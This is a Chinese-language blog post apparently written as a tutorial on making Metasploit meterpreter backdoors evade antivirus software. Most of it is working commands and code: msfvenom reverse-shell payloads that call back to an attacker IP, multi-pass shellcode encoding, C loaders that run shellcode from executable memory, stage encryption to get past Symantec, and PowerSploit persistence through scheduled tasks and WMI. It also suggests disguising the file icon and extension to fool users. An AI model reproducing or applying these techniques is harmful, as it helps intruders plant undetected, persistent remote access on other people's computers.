---
layout: post
title:  "Bypass AV meterpreter免杀技巧"
date:   2016-11-15 14:41:01 +0800
categories: MSF
tag: Bypass AV
---

* content
{:toc}



0x01 meterpreter简介
------------------

MetasploitFramework是一个缓冲区溢出测试使用的辅助工具，也可以说是一个漏洞利用和测试平台，它集成了各种平台上常见的溢出漏洞和流行的shellcode，并且不断更新，使得缓冲区溢出测试变的方便和简单。
需要说明的是meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令，经常出现什么sending stager error，如果网络真的很差的话，可以选用stageless meterpreter。

（meterpreter网上的资料很多，drops上就有不少，我们就长话短说，介绍最有用的几个。）

0x02 生成后门
---------

在旧的metasploit中，生成payload是用msfpayload+msfencode，之后rapid7整合了这两个命令变成了msfvenom，并添加了更多的功能，下面是用msfvenom生成backdoor的实例。

    msfvenom -p  windows/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f exe > /root/Desktop/Green_m.exe

这样可以生成一个使用tcp协议反向连接到192.168.1.200的4444端口的meterpreter的后门。
这样生成的exe可以运行，但是会被杀掉。

0x03 生成shellcode免杀
------------------

长话短说，手动编译meterpreter并对shellcode进行编码就能绕过静态查杀，meterpreter本身就是直接加载进内存并且有编码，绕过动态查杀基本没问题，(当然你也可以使用veil-evasion，不过效果不怎么好)

    msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00’ lhost=192.168.1.200 lport=4444   -f c

上述命令生成在之前的基础上生成基于c语言格式的shellcode，通过e参数指定编码方式，i参数指定编码次数，b参数去除指定代码，一般是空代码或者错误代码，-f指定生成格式。

    unsigned char buf[] = 
    "shellcode is here";
    main()
    {
    	( (void(*)(void))&buf)();
    }

这种方式vc++6.0能够成功编译，但是vs编译会报错，可以换成

    main()
    {
    	Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    	memcpy(Memory, buf, sizeof(buf));
    	((void(*)())Memory)();
    }

还有很多其他的方法，这里就不一一测试了。

**友情提示：在实战情况下，免杀效果会根据编译器和系统环境而变化，可以多准备一些环境进行免杀工作。**

通过上述方法编译生成的exe可以绕过几乎100%杀软，包括360，卡巴斯基，小红伞等杀软。


0x04 选择payload进行免杀
------------------

上面生成shellcode的方式是针对杀软静态免杀的，接下来说到动态行为免杀。

在对市面上主流的杀软进行测试的过程中，发现symantec会在meterpreter回连成功，从metasploit里接受数据的时候报毒。

无论是自己手动编码编译还是msf自动生成的exe都会这样被报毒。

经过笔者自己测试，使用reverse_https等payload可以anti symantec。

    msfvenom -p  windows/meterpreter/reverse_https  lhost=192.168.1.200 lport=443   -f c

但是需要在metasploit设置

    set EnableStageEncoding true
    set stageencoder x86/fnstenv_mov
    set stageencodingfallback false

将控制端向被控制端发送的stage进行编码，从而绕过symantec的查杀。

同样，使用reverse_tcp_rc4也有同样的效果，而且不能设置stageencoder选项，更稳定更方便。

    msfvenom -p  windows/meterpreter/reverse_tcp_rc4  lhost=192.168.1.200 lport=4444 RC4PASSWORD=Green-m  -f c

利用rc4对传输的数据进行加密，密钥在生成时指定，在监听的服务端设置相同的密钥。就可以在symantec眼皮地下执行meterpreter。

这里做一个抛砖引玉的作用，其他payload的查杀效果需要各大黑客自己去测试。

0x05 meterpreter常驻的免杀
---------------------

常见的添加meterpreter 常驻的方法无非两种，

persistence和metsvc，这两种方法效果还是不错的，不过在面对杀软的时候无能为力，几乎100%被杀。

下面介绍几种能绕过杀软的添加自启动方法。

 - **1.使用exploit/windows/local/registry_persistence**

通过用户自己指定payload及编码方式，将shellcode添加到注册表，然后再利用powershell加载该shellcode，成功运行meterpreter。

由于加载的payload是由metasploit指定，每次都不一定一样，这个方法在面对大部分主流AV的时候简直强大，只要不监视注册表操作不限制powershell，几乎不会被杀。

同类型的还有其他payload，如exploit/windows/local/vss_persistence，exploit/windows/local/s4u_persistence，有的效果也不错，如添加计划任务启动的功能，但或多或少都有一些限制，总体说来不如上面讲到的方法。

 - **2.利用powershell**

powershell因为其特性，被很多杀毒软件直接忽视，因此用这个方法经常能达到出其不意的效果

其实这个方式和第一种原理都是一样，不过自定义的powershell脚本效果更佳。

这里可以利用一个工具powersploit，下面用它来示范一个简单的例子。

    Import-Module .\Persistence\Persistence.psm1
    
    $ElevatedOptions = New-ElevatedPersistenceOption -ScheduledTask -OnIdle
    
    $UserOptions =New-UserPersistenceOption -ScheduledTask -Hourly
    
    Add-Persistence -FilePath .\Green_m.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose

其中Green_m.ps1是加载有payload的powershell脚本文件，你可以用msf生成一个加载meterpreter的ps1文件。

    msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f psh-reflection -o Green_m.ps1

当然你也可以选择不执行powershell文件而直接执行某个PE文件，可以通过将代码赋予变量来执行。

    $Green_m = { c:\windows\system32\notepad.exe }
    
    $ElevatedOptions =New-ElevatedPersistenceOption -PermanentWMI -AtStartup
    $UserOptions =New-UserPersistenceOption -ScheduledTask -Hourly
    Add-Persistence -ScriptBlock $Green_m -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $Us erOptions -Verbose -PassThru | Out-EncodedCommand | Out-File .\EncodedPersistentScript.ps1

powersploit还有其他非常有用的功能，有兴趣可以自己去github或者使用get-help查询。

 - **3.手动编写**

只要是工具用得太多都难免被AV发现，这个时候就需要手动编写自启动功能。

手动添加自启动，自删除，再改个图标后缀技能骗过杀软也能骗过人眼，扩展一下就是个大马，这里就不多说了。

0x06 总结
-------

meterpreter因为其简单多变的结构，强大的功能，在渗透中面对未知杀软环境的情况下效果不错。

***注：本文所做所有测试不保证完全有效，仅供参考。***

转载请注明出处：[https://green-m.github.io/2016/11/15/meterpreter-bypass-av/](https://green-m.github.io/2016/11/15/meterpreter-bypass-av/)
